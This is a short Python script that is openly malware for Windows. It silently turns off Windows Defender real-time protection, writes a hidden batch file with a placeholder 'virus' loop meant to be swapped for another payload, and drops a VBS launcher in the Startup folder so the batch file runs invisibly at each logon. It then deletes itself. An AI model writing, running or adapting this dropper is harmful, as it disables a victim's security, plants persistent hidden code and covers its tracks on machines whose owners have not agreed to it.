import os
import subprocess
import sys
cmd = ["cmd.exe","/c",'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"']
subprocess.Popen(cmd,creationflags=0x08000000,)

def self_destruct():
    current_file = os.path.abspath(sys.argv[0])
    subprocess.Popen(
        f'cmd /c ping 127.0.0.1 -n 3 >nul & del "{current_file}"'
        ,
        shell=True,
       
    )

#startup path
startup = os.path.join(
    os.environ["APPDATA"],
    r"Microsoft\Windows\Start Menu\Programs\Startup"
)


#current working directory
pwd = os.getcwd()

#batch file content - virus - change it later acording to your need
content_bat = '''@echo off
:A
echo "i am a hacker"
goto A'''

#batch file creation
with open("hack.bat","w") as f:
    f.write(content_bat)

#hiding batch file
os.system("attrib +h hack.bat")

#changing directory to "startup" folder of windows
os.chdir(startup)


#path that will be used to put in vbsscrip
vbs_path = os.path.join(pwd,"hack.bat")

content_vbs = f'''set file = CreateObject("WScript.shell")
file.Run """{vbs_path}""",0,False'''

with open("run_virus.vbs","w") as f:
    f.write(content_vbs)

os.chdir(pwd)
self_destruct()